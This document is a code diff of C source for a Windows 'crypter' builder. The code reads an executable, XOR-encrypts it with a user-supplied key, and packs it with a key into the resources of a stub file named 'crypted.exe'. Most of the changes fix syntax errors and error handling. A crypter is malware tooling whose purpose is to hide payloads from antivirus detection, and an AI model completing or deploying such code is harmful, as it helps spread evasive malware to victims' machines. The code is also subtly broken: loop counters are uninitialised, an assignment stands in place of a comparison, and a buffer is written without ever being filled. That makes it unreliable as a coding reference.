@@ -1,4 +1,4 @@
-#include "cryptersrc.h"
+#include "stdafx.h"
 
 // Allocating the file to encrypt
 
@@ -9,7 +9,7 @@ struct StubData
 	unsigned long FileSize; 
 	unsigned char * pKey;
 	unsigned long KeySize;
-}
+};
 // LoadFile (to encrypt) into Memory -> Encrypt that buffer -> Pass buffer to StubData
 
 
@@ -23,33 +23,41 @@ void LoadFile(char *File, struct StubData *sData)
 	// Load file into memory, file hasn't been loaded yet, StubData has
 	unsigned long BytesRead;
 	HANDLE hFile = CreateFile(File, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
-	printf("[*]Loading Portable Executable\n")
+	printf("Loading Portable Executable");
 
 	if (hFile == INVALID_HANDLE_VALUE)
-		error("Error - Cannot open file");
+	{
+		printf("Error - Cannot open file");
+		return;
+	}
 	sData ->FileSize = GetFileSize(hFile, NULL);
+
+
 	if (sData->FileSize = INVALID_FILE_SIZE){
 		CloseHandle(hFile);
-		error("Error - Cannot retrieve file size")
+		printf("Error - Cannot retrieve file size");
+		return;
 	}
 
 	// The stub will get a pointer to the end of the file's memory space
 	sData -> pFileBuffer = (unsigned char *)malloc(sData->FileSize);
 	if (!sData->pFileBuffer){
 		CloseHandle(hFile);
-		error("Error - Cannot allocate buffer memory");
+		printf("Error - Cannot allocate buffer memory");
+		return;
 	}
 	ReadFile(hFile, sData ->pFileBuffer, sData->FileSize, &BytesRead, NULL);
 	CloseHandle(hFile);
 }
 
 
-void AESEncrypt(struct StubData * sData)
+void AESEncrypt(struct StubData * sData, const char* userDefKey)
 {
 	//Replace with AES Encryption later 
 	int i, j;
-	sData->pKey = "setpassword"
-	sData->KeySize = strlen(sData->)
+	sData->KeySize = strlen(userDefKey);
+	sData->pKey = (unsigned char*)userDefKey;
+
 	for (i; i<sData->FileSize; i++)
 	{
 		*(sData ->pFileBuffer+i) ^= *(sData->pKey+j);
@@ -69,18 +77,24 @@ void BuildEncryptedVers (struct StubData * sData)
 	unsigned long rSize, BytesWritten;
 	unsigned char * pBuffer;
 
-	printf("[*]Building Crypted.exe\n");
+	printf("[*]Building Crypted.exe \n");
 
 	// Resource
 	hResource = FindResource(NULL, MAKEINTRESOURCE(1), "STUB");
 	if (!hResource)
-		error("Error: could not find resource");
+	{
+		printf("Error: could not find resource");
+		return;
+	}
 	rSize = SizeofResource(NULL, hResource);
 
 	// Global
 	hGlobal = LoadResource(NULL, hResource);
 	if (!hGlobal)
-		error("Error: Could not load resource");
+	{
+		printf("Error: Could not load resource");
+		return;
+	}
 	hFile = CreateFile("crypted.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 	
 	// File Operations
@@ -88,13 +102,15 @@ void BuildEncryptedVers (struct StubData * sData)
 	{
 		free(pBuffer);
 		free(sData->pFileBuffer);
-		error("Error - Could not create file");
+		printf("Error - Could not create file");
+		return;
 	}
 	if (WriteFile(hFile, pBuffer, rSize, &BytesWritten, NULL)==0)
 	{
 		free(pBuffer);
 		free(sData->pFileBuffer);
-		error("Error - Could not write to file");
+		printf("Error - Could not write to file");
+		return;
 	}
 
     // Discard the original file
@@ -104,12 +120,12 @@ void BuildEncryptedVers (struct StubData * sData)
     // Resources -> Where the data is stored
 	hUpdate = BeginUpdateResource("crypted.exe", FALSE); // Updating the encrypted file's contents
 	if(UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(10), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), sData->pFileBuffer, sData->FileSize) == 0){
-		error("Error - Could not update resource");
+		printf("Error - Could not update resource");
 	}
 
     if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(20), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), sData->pKey, sData->KeySize)==0) // Updating the file's key -> key same for both encryption and decryption
     {
-  		error("Error - Could not update resource");
+  		printf("Error - Could not update resource");
     }
     EndUpdateResource(hUpdate, FALSE);
 }
